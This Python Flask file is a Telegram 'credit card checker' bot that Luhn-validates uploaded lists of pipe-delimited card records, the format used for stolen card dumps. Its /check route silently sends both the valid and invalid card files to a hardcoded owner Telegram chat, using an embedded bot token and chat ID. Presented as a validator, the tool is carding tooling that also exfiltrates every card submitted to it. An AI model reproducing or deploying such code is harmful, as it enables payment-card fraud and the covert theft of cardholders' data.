import os
import time
import requests
import logging
from flask import Flask, request

# Initialize Flask app
app = Flask(__name__)

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot token and owner group ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7809919991:AAFwHo329iTIGLyDpbjTE1OMuZGnqp9cDLs")
OWNER_CHAT_ID = os.getenv("OWNER_CHAT_ID", "1984816095")

# Owner information
OWNER_USERNAME = "@Jukerhenapadega"

# Luhn algorithm to validate credit cards
def luhn_check(card_number):
    card_number = card_number.replace(' ', '').replace('-', '')
    total = 0
    reversed_number = card_number[::-1]
    
    for i, digit in enumerate(reversed_number):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n

    return total % 10 == 0

# Check card validity and split good and bad cards
def check_cards(file_path, pass_file, fail_file):
    valid_count = 0
    invalid_count = 0

    with open(file_path, 'r') as input_file, open(pass_file, 'w') as pass_f, open(fail_file, 'w') as fail_f:
        for line in input_file:
            card = line.strip().split('|')[0].strip()
            if luhn_check(card):
                pass_f.write(line)
                valid_count += 1
            else:
                fail_f.write(line)
                invalid_count += 1

    return valid_count, invalid_count

# Send file to the owner's group using Telegram API
def send_file_to_group(bot_token, chat_id, file_path, caption=""):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': file})
    logger.info(f'Sent file to group {chat_id}: {response.json()}')
    return response.json()

# Send messages using Telegram API
def send_message(chat_id, text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'  # Use Markdown for better text formatting
    }
    response = requests.post(url, data=payload)
    logger.info(f'Sent message to {chat_id}: {response.json()}')
    return response

# Handle incoming messages and commands
def handle_command(chat_id, message):
    if message.strip() == "/start":
        return (
            "🎉 *Welcome to the Credit Card Checker Bot!* 🎉\n\n"
            "I'm here to help you validate credit card numbers. Use the following commands:\n"
            "- `/status` to check the bot's status.\n"
            "- `/credits` to see the bot creator.\n"
            "- `/help` for a list of available commands.\n\n"
            "Feel free to send me a file for credit card validation!"
        )
    elif message.strip() == "/status":
        return "✅ *Bot Status*: The bot is up and running smoothly!"
    elif message.strip() == "/credits":
        return f"🙌 This bot was created and managed by {OWNER_USERNAME}."
    elif message.strip() == "/help":
        return (
            "ℹ️ *Help Menu:* ℹ️\n\n"
            "Here are the commands you can use:\n"
            "- `/start` - Welcome message and bot introduction.\n"
            "- `/status` - Check if the bot is running.\n"
            "- `/credits` - Information about the bot creator.\n"
            "- `/check` - Upload a file with credit card numbers for validation."
        )
    elif message.startswith("/file"):
        return "📂 To upload a file, use the `/check` command followed by the file attachment."
    else:
        return "❓ *Unknown command.* Please use `/help` to see the list of available commands."

# Handle incoming messages
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    logger.info(f'Received webhook data: {data}')

    if not data or 'message' not in data:
        logger.warning("No valid message data received in the webhook request.")
        return "No valid message data received", 400

    message = data.get('message', {})
    chat_id = message.get('chat', {}).get('id')
    text = message.get('text', "").strip()

    logger.info(f'Received message from chat_id {chat_id}: "{text}"')

    if chat_id and text:
        response_text = handle_command(chat_id, text)
        send_message(chat_id, response_text)
        return "OK", 200

    logger.warning("Chat ID or text missing in the message.")
    return "Chat ID or text missing", 400

# Handle the file checking process
@app.route('/check', methods=['POST'])
def check():
    if 'file' not in request.files:
        return "Error: No file uploaded", 400

    file = request.files['file']
    file_path = f"input_{int(time.time())}.txt"
    file.save(file_path)

    pass_file = f"pass_luhn_{int(time.time())}.txt"
    fail_file = f"fail_luhn_{int(time.time())}.txt"

    valid_count, invalid_count = check_cards(file_path, pass_file, fail_file)

    send_file_to_group(BOT_TOKEN, OWNER_CHAT_ID, pass_file, caption="✅ Valid Cards:")
    send_file_to_group(BOT_TOKEN, OWNER_CHAT_ID, fail_file, caption="❌ Invalid Cards:")

    os.remove(file_path)

    return f"✅ Check complete: {valid_count} valid cards, {invalid_count} invalid cards."

@app.route('/')
def home():
    return (
        "💳 Welcome to the Credit Card Checker Bot! 💳\n\n"
        "Credits: This bot was created and managed by {OWNER_USERNAME}."
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
